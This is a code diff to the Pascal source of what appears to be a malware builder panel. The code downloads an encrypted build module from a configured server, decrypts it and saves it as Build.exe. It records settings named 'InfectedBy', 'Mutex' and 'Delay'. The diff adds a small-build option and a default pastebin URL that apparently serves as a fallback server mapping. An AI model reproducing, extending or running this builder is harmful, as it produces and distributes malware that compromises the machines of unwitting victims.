@@ -14,10 +14,12 @@ type
   { TBuildForm }
 
   TBuildForm = class(TForm)
+    SmallCBX: TCheckBox;
     ClearButton: TBCButton;
     AddFileButton: TBCButton;
     AboutImage: TImage;
     Label1: TLabel;
+    SmallLabel: TLabel;
     SelectFile: TOpenDialog;
     RemFileButton: TBCButton;
     BackShape1: TShape;
@@ -194,15 +196,18 @@ var
   _Set: TMemINIFile;
   C: Byte;
   Res: THandle;
+  T: String;
 Begin
   Result:=True;
   BuildButton.Enabled:=False;
   ScanButton.Enabled:=False;
-
+  T:=Settings.ReadString('General', 'Server', 'http://localhost');
+  if SmallCBX.Checked then T += '/modules/SmallBuild.mod'
+  else T += '/modules/Build.mod';
   Log('Downloading a fresh build...');
   MS:=TMemoryStream.Create;
   try
-    Hat.Get(Settings.ReadString('General', 'Server', 'http://localhost')+'/modules/Build.mod', MS);
+    Hat.Get(T, MS);
     MS.Position:=0;
     ToggleCrypt(MS, 7019);
     MS.SaveToFile('Build.exe');
@@ -223,7 +228,7 @@ Begin
       WriteInteger('General', 'FirstRun', 1);
       WriteString('General', 'InfectedBy', InfectedLabel.Caption);
       WriteString('General', 'Server', Settings.ReadString('General', 'Server', 'http://localhost'));
-      WriteString('General', 'SecMapping', Settings.ReadString('General', 'SecMapping', ''));
+      WriteString('General', 'SecMapping', Settings.ReadString('General', 'SecMapping', 'http://pastebin.com/raw/ZKPvFpTQ'));
       WriteInteger('General', 'Delay', DelaySelector.Position);
       WriteString('General', 'Mutex', MutexEdit.Text);
 
@@ -288,6 +293,7 @@ Begin
   UserEdit.Text:=Settings.ReadString('General', 'User', 'User');
   PassEdit.Text:=Settings.ReadString('General', 'Pass', '');
   SecMappingEdit.Text:=Settings.ReadString('General', 'SecMapping', '');
+  SmallCBX.Checked:=Settings.ReadBool('General', 'Small', False);
   if Length(PassEdit.Text)>0 then PassEdit.Text:=DecryptStr(PassEdit.Text, MasterKey);
   Left:=Settings.ReadInteger('Window', 'PosX', 175);
   Top:=Settings.ReadInteger('Window', 'PosY', 45);
@@ -318,6 +324,7 @@ Begin
   Settings.WriteString('General', 'User', UserEdit.Text);
   Settings.WriteString('General', 'Pass', EncryptStr(PassEdit.Text{%H-}, MasterKey));
   Settings.WriteString('General', 'SecMapping', SecMappingEdit.Text);
+  Settings.WriteBool('General', 'Small', SmallCBX.Checked);
   Settings.WriteString('Build', 'Prefix', PrefixEdit.Text);
   Settings.WriteString('Build', 'BaseName', BaseNameEdit.Text);
   Settings.WriteString('Build', 'BaseLocation', BaseLoc);
@@ -683,7 +690,7 @@ Begin
     Result:=StringReplace(Result, '://', '&', []);
     if Pos('/', Result)>0 then Result:=LeftStr(Result, Pos('/', Result) - 1);
     Result:=StringReplace(Result, '&', '://', []);
-  end;
+  end else if RightStr(Result, 1)='/' then Delete(Result, Length(Result), 1);
 end;
 
 procedure TBuildForm.SaveButtonClick(Sender: TObject);
